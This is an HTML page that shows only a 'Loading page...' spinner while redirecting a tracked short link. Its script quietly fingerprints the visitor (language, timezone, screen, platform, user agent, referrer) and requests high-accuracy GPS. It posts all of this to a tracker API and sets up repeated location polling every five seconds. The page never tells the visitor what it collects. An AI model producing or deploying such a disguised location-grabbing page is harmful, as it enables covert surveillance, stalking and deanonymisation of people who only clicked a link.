<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Redirecting...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #333;
        }

        .container {
            text-align: center;
            padding: 40px;
        }

        .spinner {
            width: 36px;
            height: 36px;
            border: 3px solid #ddd;
            border-top-color: #007bff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 16px;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        .text {
            font-size: 14px;
            color: #666;
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="spinner"></div>
        <div class="text">Loading page...</div>
    </div>
    <script>
        (function () {
            // Extract link identifier from URL — supports both /t/:id and /s/:alias
            const pathParts = window.location.pathname.split('/');
            const prefix = pathParts[1]; // 't' or 's'
            const linkSlug = pathParts[pathParts.length - 1];

            // Determine API base path depending on route type
            const isAlias = prefix === 's';
            const visitUrl = isAlias
                ? '/api/tracker/alias/' + linkSlug + '/visit'
                : '/api/tracker/' + linkSlug + '/visit';
            const gpsUrl = isAlias
                ? '/api/tracker/alias/' + linkSlug + '/gps'
                : '/api/tracker/' + linkSlug + '/gps';

            // Collect visitor data
            const data = {
                language: navigator.language || navigator.userLanguage || 'Unknown',
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
                screen: screen.width + 'x' + screen.height,
                platform: navigator.platform || navigator.userAgentData?.platform || 'Unknown',
                cookiesEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack === '1',
                referrer: document.referrer || 'Direct',
                userAgent: navigator.userAgent,
            };

            // Send visit data
            function sendVisit(gps) {
                if (gps) data.gps = gps;
                fetch(visitUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data),
                })
                    .then(r => r.json())
                    .then(result => {
                        // Start continuous GPS if we have permission and got a visit ID
                        if (result.visitId && gps) {
                            startContinuousGPS(result.visitId);
                        }
                        // Redirect after short delay
                        setTimeout(() => {
                            if (result.destination) {
                                window.location.href = result.destination;
                            }
                        }, 1500);
                    })
                    .catch(() => {
                        // Still redirect on failure
                        setTimeout(() => { window.location.href = '/'; }, 2000);
                    });
            }

            // Try to get GPS location
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        sendVisit({
                            lat: pos.coords.latitude,
                            lng: pos.coords.longitude,
                            accuracy: pos.coords.accuracy,
                            altitude: pos.coords.altitude,
                            speed: pos.coords.speed,
                        });
                    },
                    () => {
                        // GPS denied — send without GPS
                        sendVisit(null);
                    },
                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                );
            } else {
                sendVisit(null);
            }

            // Continuous GPS tracking
            function startContinuousGPS(visitId) {
                if (!navigator.geolocation) return;
                setInterval(() => {
                    navigator.geolocation.getCurrentPosition(
                        (pos) => {
                            fetch(gpsUrl, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    visitId: visitId,
                                    lat: pos.coords.latitude,
                                    lng: pos.coords.longitude,
                                    accuracy: pos.coords.accuracy,
                                    altitude: pos.coords.altitude,
                                    speed: pos.coords.speed,
                                }),
                            }).catch(() => { });
                        },
                        () => { },
                        { enableHighAccuracy: true, timeout: 4000, maximumAge: 0 }
                    );
                }, 5000);
            }
        })();
    </script>
</body>

</html>
